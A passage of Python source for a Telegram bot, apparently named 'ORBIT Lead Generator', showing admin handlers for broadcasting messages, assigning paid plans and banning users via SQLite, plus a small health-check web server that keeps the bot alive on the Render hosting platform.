        logger.error(f"finish: {e}")
    finally:
        shutil.rmtree(folder, ignore_errors=True)
        active.pop(uid, None); queue_pos.pop(uid, None)

async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid   = update.effective_user.id
    state = context.user_data.get('state','')
    text  = update.message.text.strip()

    if state == 'adm_broadcast' and is_admin(uid):
        users = db_users_all(); sent = failed = 0
        for u in users:
            try:
                await context.bot.send_message(u['uid'], text, parse_mode='Markdown')
                sent += 1; await asyncio.sleep(0.05)
            except Exception: failed += 1
        context.user_data['state'] = None
        await update.message.reply_text(f"✅ Sent `{sent}`, failed `{failed}`.", parse_mode='Markdown')

    elif state == 'adm_addplan' and is_admin(uid):
        parts = text.split()
        if len(parts) >= 3:
            try:
                tuid = int(parts[0]); plan = parts[1]; days = int(parts[2])
                if plan not in ('free','weekly','monthly','yearly'):
                    await update.message.reply_text("❌ Invalid plan."); return
                exp = (datetime.utcnow()+timedelta(days=days)).isoformat()[:19] if plan != 'free' else ''
                c = sqlite3.connect(DB_PATH)
                c.execute('INSERT OR IGNORE INTO users(uid) VALUES(?)',(tuid,))
                c.execute('UPDATE users SET plan=?,plan_expires=? WHERE uid=?',(plan,exp,tuid))
                c.commit(); c.close()
                await update.message.reply_text(
                    f"✅ User `{tuid}` given *{plan}* for {days} days", parse_mode='Markdown')
            except Exception as e:
                await update.message.reply_text(f"❌ Error: {e}")
        context.user_data['state'] = None

    elif state == 'adm_ban' and is_admin(uid):
        try:
            tuid = int(text)
            c = sqlite3.connect(DB_PATH)
            row = c.execute('SELECT is_banned FROM users WHERE uid=?',(tuid,)).fetchone()
            new_ban = 0 if (row and row[0]) else 1
            c.execute('UPDATE users SET is_banned=? WHERE uid=?',(new_ban,tuid))
            c.commit(); c.close()
            await update.message.reply_text(
                f"{'✅ Banned' if new_ban else '✅ Unbanned'} user `{tuid}`", parse_mode='Markdown')
        except Exception as e:
            await update.message.reply_text(f"❌ {e}")
        context.user_data['state'] = None

import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

# Clase para responder a Render y que no tumbe el servicio
class HealthCheckHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(b"Bot is running smoothly!")
    def log_message(self, format, *args):
        return # Silenciar logs del servidor web para no llenar la consola

def run_health_check():
    # Render asigna automáticamente un puerto en la variable de entorno PORT
    port = int(os.getenv("PORT", 8080))
    server = HTTPServer(("0.0.0.0", port), HealthCheckHandler)
    print(f"🌍 Servidor de salud activo en el puerto {port}")
    server.serve_forever()

def main():
    if not BOT_TOKEN: print("❌ Set BOT_TOKEN in .env"); return
    db_init()
    
    # Arrancamos el servidor web en segundo plano para engañar a Render
    web_thread = threading.Thread(target=run_health_check, daemon=True)
    web_thread.start()
    
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start",   cmd_start))
    app.add_handler(CommandHandler("stats",   cmd_stats))
    app.add_handler(CommandHandler("pause",   cmd_pause))
    app.add_handler(CommandHandler("resume",  cmd_resume))
    app.add_handler(CommandHandler("stop",    cmd_stop))
    app.add_handler(CommandHandler("status",  cmd_status))
    app.add_handler(CallbackQueryHandler(btn))
    app.add_handler(MessageHandler(filters.Document.ALL, file_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
    print("✅ ORBIT Lead Generator v10 started — MEOW login + static fallback")
    app.run_polling(drop_pending_updates=True)

if __name__ == '__main__': main()
